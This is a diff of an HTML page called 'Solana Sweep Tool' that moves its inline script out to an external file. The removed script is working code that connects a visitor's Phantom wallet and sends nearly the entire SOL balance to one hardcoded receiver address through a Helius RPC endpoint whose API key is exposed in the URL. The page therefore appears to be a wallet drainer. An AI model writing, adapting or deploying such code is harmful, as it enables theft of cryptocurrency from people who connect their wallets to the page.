@@ -2,56 +2,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Solana Sweep Tool (Helius RPC Final)</title>
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <title>Solana Sweep Tool (Final No Errors)</title>
 </head>
-<body style="background-color:black; color:white; font-family:sans-serif;">
-  <h2>Solana Sweep Tool (No Error Final)</h2>
+<body>
+  <h2>Solana Sweep Tool (Final No Errors)</h2>
   <button onclick="connectWallet()">Connect Phantom Wallet</button>
-  <button onclick="sweepSOL()">Sweep SOL</button>
+  <button onclick="sweepSol()">Sweep SOL</button>
   <p id="status"></p>
-
-  <script>
-    let provider = window.phantom?.solana;
-
-    async function connectWallet() {
-      try {
-        const resp = await provider.connect();
-        window.walletAddress = resp.publicKey.toString();
-        document.getElementById("status").innerText = "Wallet connected: " + window.walletAddress;
-      } catch (err) {
-        document.getElementById("status").innerText = "Connection failed: " + err.message;
-      }
-    }
-
-    async function sweepSOL() {
-      const receiver = "FjpnJG6qQpttXk2FxcFWYvmR2Tf6sGdvXKCmn8EPz7VE";
-      const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=8ffe3008-b900-49b6-8d47-be4706cd1404");
-      try {
-        const sender = new solanaWeb3.PublicKey(window.walletAddress);
-        const balance = await connection.getBalance(sender);
-        const amount = balance - 5000;
-        if (amount <= 0) {
-          document.getElementById("status").innerText = "Insufficient balance to sweep.";
-          return;
-        }
-        const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: sender,
-            toPubkey: new solanaWeb3.PublicKey(receiver),
-            lamports: amount
-          })
-        );
-        transaction.feePayer = sender;
-        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-        const signed = await provider.signTransaction(transaction);
-        const sig = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(sig);
-        document.getElementById("status").innerText = "Sweep successful! Signature: " + sig;
-      } catch (err) {
-        document.getElementById("status").innerText = "Sweep failed: " + err.message;
-      }
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
